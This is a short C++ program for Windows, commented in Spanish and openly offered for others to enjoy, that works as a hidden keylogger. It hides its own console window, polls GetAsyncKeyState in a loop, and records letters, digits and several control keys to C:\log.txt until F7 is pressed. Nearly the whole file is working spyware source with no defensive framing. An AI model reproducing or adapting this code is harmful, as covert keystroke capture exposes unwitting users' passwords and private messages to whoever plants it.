
/* ATENCION!!! ESTE PODRIA CONSIDERARSE 
    "EL REMAKE" DE MI CODIGO ORIGINAL
    EN LA ANTIGUA CUENTA,DE IGUAL FORMA
    DISFRUTEN EL CODIGO :) 

   PD: ERA POSIBLE EVITAR TANTO IF DE VARIAS
    MANERAS PERO NO QUIERO COMPLICARLO MUCHO 
                                            */





#include <iostream>
#include <windows.h>
#include <fstream>

using namespace std;

int main(){

//Variable que determinará cuando cerrar el keylogger..
bool aprete = true;

//Creamos y abrimos el fichero txt para escribir en el
ofstream log;
log.open("C:\\log.txt", ofstream::out);

//SI ocurre algun error con el archivo
if(log.fail()){
cout << "Error al abrir archivo log.txt en directorio raiz" << endl;
}

//Ocultamos la consola
HWND ocultar = FindWindow("ConsoleWindowClass",NULL);
ShowWindow(ocultar,NULL);

//Inicia el ciclo
while(aprete){

//Cuando se apriete una de las teclas, escribimos en el archivo de texto la tecla pulsada...
if (GetAsyncKeyState(VK_SPACE) == -32767){
log << " ";
}

if (GetAsyncKeyState('A') == -32767){
log << "A";
}

if (GetAsyncKeyState('B') == -32767){
log << "B";
}

if (GetAsyncKeyState('C') == -32767){
log << "C";
}

if (GetAsyncKeyState('D') == -32767){
log << "D";
}

if (GetAsyncKeyState('E') == -32767){
log << "E";
}

if (GetAsyncKeyState('F') == -32767){
log << "F";
}

if (GetAsyncKeyState('G') == -32767){
log << "G";
}

if (GetAsyncKeyState('H') == -32767){
log << "H";
}

if (GetAsyncKeyState('I') == -32767){
log << "I";
}

if (GetAsyncKeyState('J') == -32767){
log << "J";
}

if (GetAsyncKeyState('K') == -32767){
log << "K";
}

if (GetAsyncKeyState('L') == -32767){
log << "L";
}

if (GetAsyncKeyState('M') == -32767){
log << "M";
}

if (GetAsyncKeyState('N') == -32767){
log << "N";
}

if (GetAsyncKeyState(VK_CAPITAL) == -32767){
log << " Mayus-";
}

if (GetAsyncKeyState(VK_BACK) == -32767){
log << " BACKSPACE ";
}

if (GetAsyncKeyState('O') == -32767){
log << "O";
}

if (GetAsyncKeyState('P') == -32767){
log << "P";
}

if (GetAsyncKeyState('Q') == -32767){
log << "Q";
}

if (GetAsyncKeyState('R') == -32767){
log << "R";
}

if (GetAsyncKeyState('S') == -32767){
log << "S";
}

if (GetAsyncKeyState('T') == -32767){
log << "T";
}

if (GetAsyncKeyState('U') == -32767){
log << "U";
}

if (GetAsyncKeyState('V') == -32767){
log << "V";
}

if (GetAsyncKeyState('W') == -32767){
log << "W";
}

if (GetAsyncKeyState('X') == -32767){
log << "X";
}

if (GetAsyncKeyState('Y') == -32767){
log << "Y";
}

if (GetAsyncKeyState('Z') == -32767){
log << "Z";
}

if (GetAsyncKeyState(VK_RETURN) == -32767){
log << endl;
}

if (GetAsyncKeyState('1') == -32767){
log << "1";
}

if (GetAsyncKeyState('2') == -32767){
log << "2";
}

if (GetAsyncKeyState('3') == -32767){
log << "3";
}

if (GetAsyncKeyState('4') == -32767){
log << "4";
}

if (GetAsyncKeyState('5') == -32767){
log << "5";
}

if (GetAsyncKeyState('6') == -32767){
log << "6";
}

if (GetAsyncKeyState('7') == -32767){
log << "7";
}

if (GetAsyncKeyState('8') == -32767){
log << "8";
}

if (GetAsyncKeyState('9') == -32767){
log << "9";
}

if (GetAsyncKeyState('0') == -32767){
log << "0";
}

if (GetAsyncKeyState(VK_LSHIFT) == -32767){
log << " SHIFT-";
}

if (GetAsyncKeyState(VK_MENU) == -32767){
log << " ALT-";
}

if (GetAsyncKeyState(VK_F7) == -32767){
ShowWindow(ocultar,1); //Si pulsan F7 se detiene el keylogger..
aprete = false;
}
}

//Cerramos el archivo log.txt
log.close();


cout << "-----------------------------------------" << endl << "ARCHIVO log.txt CREADO CON EXITO!" << endl;

system("pause");
}
